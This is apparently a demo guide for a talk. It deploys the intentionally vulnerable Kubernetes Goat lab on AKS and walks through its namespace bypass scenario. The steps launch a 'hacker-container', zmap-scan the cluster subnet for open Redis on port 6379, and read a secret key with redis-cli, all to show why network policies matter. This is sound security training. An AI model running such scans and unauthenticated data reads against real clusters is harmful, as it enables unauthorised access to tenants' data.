# Demo 2 - Use Kubernetes Goat to run through a namespace bypass experiment to illustrate importance of proper tenant isolation with network security policies

**Application used during demo:**

[Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat)

Deploy Kubernetes Goat to AKS:

```sh
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
bash setup-kubernetes-goat.sh
```

* If you see ```CrashLoopBackOff``` state for ```internal-proxy-deployment```, you will need to increase memory limits to at least ```100Mi```, see this GitHub Issue: [pod(system-monitor-deployment) CrashLoopBackOff](https://github.com/madhuakula/kubernetes-goat/issues/66)

```kubectl edit deploy internal-proxy-deployment```

* If you see ```health-check-deployment``` being stuck in ```ContainerCreating``` state with error message ```"hostPath type check failed: /var/run/docker.sock is not a file"```, you will need to remove ```type: File``` on line ```33``` of the ```deployment.yaml``` file in ```/scenarios/health-check```. This happens due to the fact that support for Dockershim has been removed in newer versions of Kubernetes and AKS. See this GitHub Issue: [Health Check Deployment Pod not running](https://github.com/madhuakula/kubernetes-goat/issues/23)

```kubectl edit deploy health-check-deployment```

**Commands used during demo:**

See namespace bypass scenario in official documentation: [Kubernetes Goat scenarios](https://madhuakula.com/kubernetes-goat/docs/scenarios)

- Run container that we will be accessing namespaced resource from: ```kubectl run hacker-container --image=madhuakula/hacker-container```
- Log into created container and start command shell: ```kubectl exec hacker-container -it -- sh```
- Get information about AKS  cluster vNet and subnets: ```az aks show --resource-group aks-sp-demo --name chamber-of-secrets | grep vnetSubnetId```
- Get IP range for AKS cluster subnet (in this use case the default subnet): ```az network vnet subnet show -g aks-sp-demo -n default --vnet-name aks-sp-demo-vnet | grep addressPrefix```
- Scan retrieved IP range with zmap (which is more lightweight and faster network scan tool than nmap) for any exposed apps on port 6379 which is default Redis port - save scan result to a txt-file: ```zmap -p 6379 10.240.0.0/16 -o scanresults.txt```
- Print output of txt-file in command shell: ```cat scanresults.txt```
- Connect to exposed Redis Pod on the default port (6379) with redis-cli: ```redis-cli -h 10.240.0.98```
- Run some Redis commands:
    * ```ping```
    * ```keys *```
    * Retrieve flag: ```get SECRETSTUFF```